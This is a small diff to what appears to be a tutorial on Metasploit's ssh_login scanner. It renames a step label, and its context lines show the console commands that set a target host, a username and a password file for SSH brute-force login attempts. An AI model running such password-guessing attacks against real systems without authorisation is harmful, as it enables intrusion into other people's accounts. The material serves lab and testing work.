@@ -117,7 +117,7 @@ msf6 > auxiliary(scanner/ssh/ssh_login) > set RHOSTS x.x.x.x
 msf6 > auxiliary(scanner/ssh/ssh_login) > set USERNAME xxxxx
 ```
 
-- Set the password list (PASS_LIST):
+- Set the password list (PASS_FILE):
 ```
 msf6 > auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /home/attackVM/passwords.txt
 ```
